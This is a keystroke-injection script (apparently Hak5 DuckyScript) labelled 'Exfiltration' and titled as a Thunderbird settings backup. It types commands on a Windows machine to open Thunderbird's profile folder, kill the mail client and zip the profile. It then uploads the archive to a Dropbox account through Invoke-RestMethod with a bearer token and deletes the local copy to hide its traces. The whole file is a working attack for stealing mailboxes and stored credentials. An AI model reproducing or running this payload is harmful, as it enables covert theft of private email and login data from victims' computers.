* REM ###############################################################
* REM #                                                             #
* REM # Title       : Save Your Thunderbird Settings via Dropbox    #
* REM # Author      : Aleff                                         #
* REM # Version     : 1.0                                           #
* REM # Category    : Exfiltration                                  #
* REM # Target      : Windows 10/11                                 #
* REM #                                                             #
* REM ###############################################################

ATTACKMODE HID

* REM Variables Settings
ARCHIVE_NAME="cache.zip"
ACCESS_TOKEN="aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1Sdlk1cGxvbzFPSQ=="
DROPBOX_FOLDER_PATH="/"
DROPBOX_CONST_LINK ="https://content.dropboxapi.com/2/files/upload"

* REM Opening Thunderbird settings
QUACK DELAY 1500
QUACK GUI r
QUACK STRING thunderbird
QUACK ENTER
QUACK DELAY 1000
QUACK TAB
QUACK TAB
QUACK TAB
QUACK TAB
QUACK DELAY 500
QUACK ENTER
QUACK DELAY 500
QUACK UPARROW
QUACK UPARROW
QUACK DELAY 500
QUACK ENTER
QUACK DELAY 500
QUACK UPARROW
QUACK UPARROW
QUACK UPARROW
QUACK DELAY 500
QUACK ENTER
QUACK DELAY 500

* REM Inside the settings
QUACK TAB
QUACK TAB
QUACK TAB
QUACK TAB
QUACK TAB
QUACK TAB
QUACK TAB
QUACK TAB
QUACK TAB
QUACK TAB
QUACK TAB
QUACK DELAY 500
QUACK ENTER
QUACK DELAY 500

* REM Inside The Profile Folder
QUACK TAB
QUACK TAB
QUACK TAB
QUACK TAB
QUACK DELAY 500
QUACK ENTER
QUACK DELAY 500
QUACK CTRL c
QUACK DELAY 500
QUACK ALT F4
QUACK DELAY 500

* REM Powershell running...
QUACK GUI r
QUACK STRING powershell
QUACK ENTER
QUACK DELAY 1500
QUACK STRING cd $env:TEMP
QUACK ENTER
QUACK DELAY 500
QUACK STRING Stop-Process -Name "thunderbird" -Force
QUACK ENTER
QUACK DELAY 500
QUACK STRING Compress-Archive -LiteralPath 
QUACK DELAY 500
QUACK CTRL v
QUACK DELAY 500
QUACK STRING  -DestinationPath ./$ARCHIVE_NAME
QUACK ENTER
QUACK DELAY 1000

* REM Exfiltration via Dropbox
QUACK STRING $filePath = "$env:TEMP/$ARCHIVE_NAME"
QUACK ENTER
QUACK DELAY 500
QUACK STRING $filePath = $filePath -replace "\\", "/"
QUACK ENTER
QUACK DELAY 500
QUACK STRING $dropboxPath = "$DROPBOX_FOLDER_PATH$ARCHIVE_NAME"
QUACK ENTER
QUACK DELAY 500
QUACK STRING $accessToken = "$ACCESS_TOKEN"
QUACK ENTER
QUACK DELAY 500
QUACK STRING $fileContent = [System.IO.File]::ReadAllBytes($filePath)
QUACK ENTER
QUACK DELAY 500
QUACK STRING $headers = @{
QUACK ENTER
QUACK DELAY 500
QUACK STRING "Authorization" = "Bearer $accessToken"
QUACK ENTER
QUACK DELAY 500
QUACK STRING "Dropbox-API-Arg" = ("{`"path`": `"" + $dropboxPath + "`", `"mode`": `"add`", `"autorename`": true, `"mute`": false}")
QUACK ENTER
QUACK DELAY 500
QUACK STRING "Content-Type" = "application/octet-stream"
QUACK ENTER
QUACK DELAY 500
QUACK STRING }
QUACK ENTER
QUACK DELAY 500
QUACK STRING Invoke-RestMethod -Uri "$DROPBOX_CONST_LINK" -Method Post -Headers $headers -Body $fileContent; rm $filePath; exit
QUACK ENTER